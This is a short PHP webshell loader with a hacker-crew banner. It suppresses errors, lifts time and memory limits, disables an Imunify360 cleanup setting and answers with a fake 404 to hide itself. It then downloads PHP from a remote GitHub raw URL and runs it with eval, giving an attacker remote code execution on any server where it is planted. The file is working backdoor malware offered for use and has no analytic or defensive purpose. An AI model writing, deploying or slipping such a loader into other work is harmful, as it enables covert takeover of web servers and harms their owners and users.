<?php
session_start();
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
ini_set('max_execution_time', 3600);
ini_set('memory_limit', '-1');
/*

         __|  | |        |    |                |               
       __  __ _|  _     _|   _|   _` |   _|  | /   -_)   _|
       ____/   _| _/  _ __| __| __,_| __| __ ___| _|	
	   
                            WEEBSHELL  | PAPAKU DORKING SHELL
							- MAKLO HEKER
							
	Author: Hekerman
	version: Bapak Mu Pass Jadi Heker

	
	
	
	Greetz:
		
		Gantenger's Crew | devilzc0de | 
		Indonesian Coder  |And YOU Scripts Kiddies
							
*/
ini_set('mail.add_x_header', 0);
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
$url = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/rave.php';
$ohct = file_get_contents($url);
eval('?>' . $ohct);
?>
